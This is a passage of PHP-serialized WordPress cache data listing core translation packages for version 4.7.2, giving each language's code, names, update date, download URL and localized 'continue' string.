dili\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/az.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"az\";i:2;s:3:\"aze\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:5:\"Davam\";}}s:3:\"azb\";a:8:{s:8:\"language\";s:3:\"azb\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-09-12 20:34:31\";s:12:\"english_name\";s:17:\"South Azerbaijani\";s:11:\"native_name\";s:29:\"گؤنئی آذربایجان\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/azb.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"az\";i:3;s:3:\"azb\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Continue\";}}s:3:\"bel\";a:8:{s:8:\"language\";s:3:\"bel\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-09-01 08:27:29\";s:12:\"english_name\";s:10:\"Belarusian\";s:11:\"native_name\";s:29:\"Беларуская мова\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/bel.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"be\";i:2;s:3:\"bel\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:20:\"Працягнуць\";}}s:5:\"bg_BG\";a:8:{s:8:\"language\";s:5:\"bg_BG\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-03-06 09:18:57\";s:12:\"english_name\";s:9:\"Bulgarian\";s:11:\"native_name\";s:18:\"Български\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/bg_BG.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"bg\";i:2;s:3:\"bul\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:12:\"Напред\";}}s:5:\"bn_BD\";a:8:{s:8:\"language\";s:5:\"bn_BD\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-04 16:58:43\";s:12:\"english_name\";s:7:\"Bengali\";s:11:\"native_name\";s:15:\"বাংলা\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/bn_BD.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"bn\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:23:\"এগিয়ে চল.\";}}s:2:\"bo\";a:8:{s:8:\"language\";s:2:\"bo\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-09-05 09:44:12\";s:12:\"english_name\";s:7:\"Tibetan\";s:11:\"native_name\";s:21:\"བོད་ཡིག\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/bo.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"bo\";i:2;s:3:\"tib\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:24:\"མུ་མཐུད།\";}}s:5:\"bs_BA\";a:8:{s:8:\"language\";s:5:\"bs_BA\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-09-04 20:20:28\";s:12:\"english_name\";s:7:\"Bosnian\";s:11:\"native_name\";s:8:\"Bosanski\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/bs_BA.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"bs\";i:2;s:3:\"bos\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:7:\"Nastavi\";}}s:2:\"ca\";a:8:{s:8:\"language\";s:2:\"ca\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-03-05 11:34:47\";s:12:\"english_name\";s:7:\"Catalan\";s:11:\"native_name\";s:7:\"Català\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/ca.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ca\";i:2;s:3:\"cat\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Continua\";}}s:3:\"ceb\";a:8:{s:8:\"language\";s:3:\"ceb\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-03-02 17:25:51\";s:12:\"english_name\";s:7:\"Cebuano\";s:11:\"native_name\";s:7:\"Cebuano\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/ceb.zip\";s:3:\"iso\";a:2:{i:2;s:3:\"ceb\";i:3;s:3:\"ceb\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:7:\"Padayun\";}}s:5:\"cs_CZ\";a:8:{s:8:\"language\";s:5:\"cs_CZ\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-12 08:46:26\";s:12:\"english_name\";s:5:\"Czech\";s:11:\"native_name\";s:12:\"Čeština‎\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/cs_CZ.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"cs\";i:2;s:3:\"ces\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:11:\"Pokračovat\";}}s:2:\"cy\";a:8:{s:8:\"language\";s:2:\"cy\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:49:29\";s:12:\"english_name\";s:5:\"Welsh\";s:11:\"native_name\";s:7:\"Cymraeg\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/cy.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"cy\";i:2;s:3:\"cym\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Parhau\";}}s:5:\"da_DK\";a:8:{s:8:\"language\";s:5:\"da_DK\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-28 00:33:54\";s:12:\"english_name\";s:6:\"Danish\";s:11:\"native_name\";s:5:\"Dansk\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/da_DK.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"da\";i:2;s:3:\"dan\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:12:\"Forts&#230;t\";}}s:12:\"de_DE_formal\";a:8:{s:8:\"language\";s:12:\"de_DE_formal\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-18 10:45:41\";s:12:\"english_name\";s:15:\"German (Formal)\";s:11:\"native_name\";s:13:\"Deutsch (Sie)\";s:7:\"package\";s:71:\"https://downloads.wordpress.org/translation/core/4.7.2/de_DE_formal.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"de\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Weiter\";}}s:5:\"de_DE\";a:8:{s:8:\"language\";s:5:\"de_DE\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-18 10:54:37\";s:12:\"english_name\";s:6:\"German\";s:11:\"native_name\";s:7:\"Deutsch\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/de_DE.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"de\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Weiter\";}}s:14:\"de_CH_informal\";a:8:{s:8:\"language\";s:14:\"de_CH_informal\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:39:59\";s:12:\"english_name\";s:30:\"German (Switzerland, Informal)\";s:11:\"native_name\";s:21:\"Deutsch (Schweiz, Du)\";s:7:\"package\";s:73:\"https://downloads.wordpress.org/translation/core/4.7.2/de_CH_informal.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"de\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Weiter\";}}s:5:\"de_CH\";a:8:{s:8:\"language\";s:5:\"de_CH\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:40:03\";s:12:\"english_name\";s:20:\"German (Switzerland)\";s:11:\"native_name\";s:17:\"Deutsch (Schweiz)\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/de_CH.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"de\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Weiter\";}}s:3:\"dzo\";a:8:{s:8:\"language\";s:3:\"dzo\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-06-29 08:59:03\";s:12:\"english_name\";s:8:\"Dzongkha\";s:11:\"native_name\";s:18:\"རྫོང་ཁ\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/dzo.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"dz\";i:2;s:3:\"dzo\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:0:\"\";}}s:2:\"el\";a:8:{s:8:\"language\";s:2:\"el\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-21 10:37:42\";s:12:\"english_name\";s:5:\"Greek\";s:11:\"native_name\";s:16:\"Ελληνικά\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/el.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"el\";i:2;s:3:\"ell\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:16:\"Συνέχεια\";}}s:5:\"en_AU\";a:8:{s:8:\"language\";s:5:\"en_AU\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-27 00:40:28\";s:12:\"english_name\";s:19:\"English (Australia)\";s:11:\"native_name\";s:19:\"English (Australia)\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/en_AU.zip\";s:3:\"iso\";a:3:{i:1;s:2:\"en\";i:2;s:3:\"eng\";i:3;s:3:\"eng\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Continue\";}}s:5:\"en_ZA\";a:8:{s:8:\"language\";s:5:\"en_ZA\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:53:43\";s:12:\"english_name\";s:22:\"English (South Africa)\";s:11:\"native_name\";s:22:\"English (South Africa)\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/en_ZA.zip\";s:3:\"iso\";a:3:{i:1;s:2:\"en\";i:2;s:3:\"eng\";i:3;s:3:\"eng\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Continue\";}}s:5:\"en_CA\";a:8:{s:8:\"language\";s:5:\"en_CA\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:49:34\";s:12:\"english_name\";s:16:\"English (Canada)\";s:11:\"native_name\";s:16:\"English (Canada)\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/en_CA.zip\";s:3:\"iso\";a:3:{i:1;s:2:\"en\";i:2;s:3:\"eng\";i:3;s:3:\"eng\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Continue\";}}s:5:\"en_NZ\";a:8:{s:8:\"language\";s:5:\"en_NZ\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:54:30\";s:12:\"english_name\";s:21:\"English (New Zealand)\";s:11:\"native_name\";s:21:\"English (New Zealand)\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/en_NZ.zip\";s:3:\"iso\";a:3:{i:1;s:2:\"en\";i:2;s:3:\"eng\";i:3;s:3:\"eng\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Continue\";}}s:5:\"en_GB\";a:8:{s:8:\"language\";s:5:\"en_GB\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-28 03:10:25\";s:12:\"english_name\";s:12:\"English (UK)\";s:11:\"native_name\";s:12:\"English (UK)\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/en_GB.zip\";s:3:\"iso\";a:3:{i:1;s:2:\"en\";i:2;s:3:\"eng\";i:3;s:3:\"eng\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Continue\";}}s:2:\"eo\";a:8:{s:8:\"language\";s:2:\"eo\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:47:07\";s:12:\"english_name\";s:9:\"Esperanto\";s:11:\"native_name\";s:9:\"Esperanto\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/eo.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"eo\";i:2;s:3:\"epo\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Daŭrigi\";}}s:5:\"es_CL\";a:8:{s:8:\"language\";s:5:\"es_CL\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-11-28 20:09:49\";s:12:\"english_name\";s:15:\"Spanish (Chile)\";s:11:\"native_name\";s:17:\"Español de Chile\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/es_CL.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"es\";i:2;s:3:\"spa\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:5:\"es_PE\";a:8:{s:8:\"language\";s:5:\"es_PE\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-09-09 09:36:22\";s:12:\"english_name\";s:14:\"Spanish (Peru)\";s:11:\"native_name\";s:17:\"Español de Perú\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/es_PE.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"es\";i:2;s:3:\"spa\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:5:\"es_ES\";a:8:{s:8:\"language\";s:5:\"es_ES\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-17 15:41:04\";s:12:\"english_name\";s:15:\"Spanish (Spain)\";s:11:\"native_name\";s:8:\"Español\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/es_ES.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"es\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:5:\"es_MX\";a:8:{s:8:\"language\";s:5:\"es_MX\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:42:28\";s:12:\"english_name\";s:16:\"Spanish (Mexico)\";s:11:\"native_name\";s:19:\"Español de México\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/es_MX.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"es\";i:2;s:3:\"spa\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:5:\"es_VE\";a:8:{s:8:\"language\";s:5:\"es_VE\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:53:56\";s:12:\"english_name\";s:19:\"Spanish (Venezuela)\";s:11:\"native_name\";s:21:\"Español de Venezuela\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/es_VE.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"es\";i:2;s:3:\"spa\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:5:\"es_AR\";a:8:{s:8:\"language\";s:5:\"es_AR\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:41:31\";s:12:\"english_name\";s:19:\"Spanish (Argentina)\";s:11:\"native_name\";s:21:\"Español de Argentina\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/es_AR.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"es\";i:2;s:3:\"spa\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:5:\"es_CO\";a:8:{s:8:\"language\";s:5:\"es_CO\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:54:37\";s:12:\"english_name\";s:18:\"Spanish (Colombia)\";s:11:\"native_name\";s:20:\"Español de Colombia\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/es_CO.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"es\";i:2;s:3:\"spa\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:5:\"es_GT\";a:8:{s:8:\"language\";s:5:\"es_GT\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:54:37\";s:12:\"english_name\";s:19:\"Spanish (Guatemala)\";s:11:\"native_name\";s:21:\"Español de Guatemala\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/es_GT.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"es\";i:2;s:3:\"spa\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:2:\"et\";a:8:{s:8:\"language\";s:2:\"et\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-27 16:37:11\";s:12:\"english_name\";s:8:\"Estonian\";s:11:\"native_name\";s:5:\"Eesti\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/et.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"et\";i:2;s:3:\"est\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Jätka\";}}s:2:\"eu\";a:8:{s:8:\"language\";s:2:\"eu\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:54:33\";s:12:\"english_name\";s:6:\"Basque\";s:11:\"native_name\";s:7:\"Euskara\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/eu.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"eu\";i:2;s:3:\"eus\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Jarraitu\";}}s:5:\"fa_IR\";a:8:{s:8:\"language\";s:5:\"fa_IR\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-02 15:21:03\";s:12:\"english_name\";s:7:\"Persian\";s:11:\"native_name\";s:10:\"فارسی\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/fa_IR.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"fa\";i:2;s:3:\"fas\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:10:\"ادامه\";}}s:2:\"fi\";a:8:{s:8:\"language\";s:2:\"fi\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:42:25\";s:12:\"english_name\";s:7:\"Finnish\";s:11:\"native_name\";s:5:\"Suomi\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/fi.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"fi\";i:2;s:3:\"fin\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:5:\"Jatka\";}}s:5:\"fr_FR\";a:8:{s:8:\"language\";s:5:\"fr_FR\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-19 21:32:45\";s:12:\"english_name\";s:15:\"French (France)\";s:11:\"native_name\";s:9:\"Français\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/fr_FR.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"fr\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuer\";}}s:5:\"fr_CA\";a:8:{s:8:\"language\";s:5:\"fr_CA\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-03 21:08:25\";s:12:\"english_name\";s:15:\"French (Canada)\";s:11:\"native_name\";s:19:\"Français du Canada\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/fr_CA.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"fr\";i:2;s:3:\"fra\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuer\";}}s:5:\"fr_BE\";a:8:{s:8:\"language\";s:5:\"fr_BE\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:40:32\";s:12:\"english_name\";s:16:\"French (Belgium)\";s:11:\"native_name\";s:21:\"Français de Belgique\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/fr_BE.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"fr\";i:2;s:3:\"fra\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuer\";}}s:2:\"gd\";a:8:{s:8:\"language\";s:2:\"gd\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-08-23 17:41:37\";s:12:\"english_name\";s:15:\"Scottish Gaelic\";s:11:\"native_name\";s:9:\"Gàidhlig\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/gd.zip\";s:3:\"iso\";a:3:{i:1;s:2:\"gd\";i:2;s:3:\"gla\";i:3;s:3:\"gla\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:15:\"Lean air adhart\";}}s:5:\"gl_ES\";a:8:{s:8:\"language\";s:5:\"gl_ES\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:40:27\";s:12:\"english_name\";s:8:\"Galician\";s:11:\"native_name\";s:6:\"Galego\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/gl_ES.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"gl\";i:2;s:3:\"glg\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:2:\"gu\";a:8:{s:8:\"language\";s:2:\"gu\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-07 18:47:03\";s:12:\"english_name\";s:8:\"Gujarati\";s:11:\"native_name\";s:21:\"ગુજરાતી\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/gu.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"gu\";i:2;s:3:\"guj\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:31:\"ચાલુ રાખવું\";}}s:3:\"haz\";a:8:{s:8:\"language\";s:3:\"haz\";s:7:\"version\";s:5:\"4.4.2\";s:7:\"updated\";s:19:\"2015-12-05 00:59:09\";s:12:\"english_name\";s:8:\"Hazaragi\";s:11:\"native_name\";s:15:\"هزاره گی\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.4.2/haz.zip\";s:3:\"iso\";a:1:{i:3;s:3:\"haz\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:10:\"ادامه\";}}s:5:\"he_IL\";a:8:{s:8:\"language\";s:5:\"he_IL\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-29 21:21:10\";s:12:\"english_name\";s:6:\"Hebrew\";s:11:\"native_name\";s:16:\"עִבְרִית\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/he_IL.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"he\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"המשך\";}}s:5:\"hi_IN\";a:8:{s:8:\"language\";s:5:\"hi_IN\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-03-03 12:18:25\";s:12:\"english_name\";s:5:\"Hindi\";s:11:\"native_name\";s:18:\"हिन्दी\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/hi_IN.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"hi\";i:2;s:3:\"hin\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:12:\"जारी\";}}s:2:\"hr\";a:8:{s:8:\"language\";s:2:\"hr\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-29 13:53:21\";s:12:\"english_name\";s:8:\"Croatian\";s:11:\"native_name\";s:8:\"Hrvatski\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/hr.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"hr\";i:2;s:3:\"hrv\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:7:\"Nastavi\";}}s:5:\"hu_HU\";a:8:{s:8:\"language\";s:5:\"hu_HU\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:48:39\";s:12:\"english_name\";s:9:\"Hungarian\";s:11:\"native_name\";s:6:\"Magyar\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/hu_HU.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"hu\";i:2;s:3:\"hun\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:10:\"Folytatás\";}}s:2:\"hy\";a:8:{s:8:\"language\";s:2:\"hy\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-12-03 16:21:10\";s:12:\"english_name\";s:8:\"Armenian\";s:11:\"native_name\";s:14:\"Հայերեն\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/hy.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"hy\";i:2;s:3:\"hye\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:20:\"Շարունակել\";}}s:5:\"id_ID\";a:8:{s:8:\"language\";s:5:\"id_ID\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-03-06 15:59:06\";s:12:\"english_name\";s:10:\"Indonesian\";s:11:\"native_name\";s:16:\"Bahasa Indonesia\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/id_ID.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"id\";i:2;s:3:\"ind\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Lanjutkan\";}}s:5:\"is_IS\";a:8:{s:8:\"language\";s:5:\"is_IS\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-16 13:36:46\";s:12:\"english_name\";s:9:\"Icelandic\";s:11:\"native_name\";s:9:\"Íslenska\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/is_IS.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"is\";i:2;s:3:\"isl\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Áfram\";}}s:5:\"it_IT\";a:8:{s:8:\"language\";s:5:\"it_IT\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-03-04 15:41:03\";s:12:\"english_name\";s:7:\"Italian\";s:11:\"native_name\";s:8:\"Italiano\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/it_IT.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"it\";i:2;s:3:\"ita\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Continua\";}}s:2:\"ja\";a:8:{s:8:\"language\";s:2:\"ja\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-03 01:42:19\";s:12:\"english_name\";s:8:\"Japanese\";s:11:\"native_name\";s:9:\"日本語\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/ja.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"ja\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"続ける\";}}s:5:\"ka_GE\";a:8:{s:8:\"language\";s:5:\"ka_GE\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:40:24\";s:12:\"english_name\";s:8:\"Georgian\";s:11:\"native_name\";s:21:\"ქართული\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/ka_GE.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ka\";i:2;s:3:\"kat\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:30:\"გაგრძელება\";}}s:3:\"kab\";a:8:{s:8:\"language\";s:3:\"kab\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:39:13\";s:12:\"english_name\";s:6:\"Kabyle\";s:11:\"native_name\";s:9:\"Taqbaylit\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/kab.zip\";s:3:\"iso\";a:2:{i:2;s:3:\"kab\";i:3;s:3:\"kab\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Kemmel\";}}s:2:\"km\";a:8:{s:8:\"language\";s:2:\"km\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-12-07 02:07:59\";s:12:\"english_name\";s:5:\"Khmer\";s:11:\"native_name\";s:27:\"ភាសាខ្មែរ\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/km.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"km\";i:2;s:3:\"khm\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:12:\"បន្ត\";}}s:5:\"ko_KR\";a:8:{s:8:\"language\";s:5:\"ko_KR\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 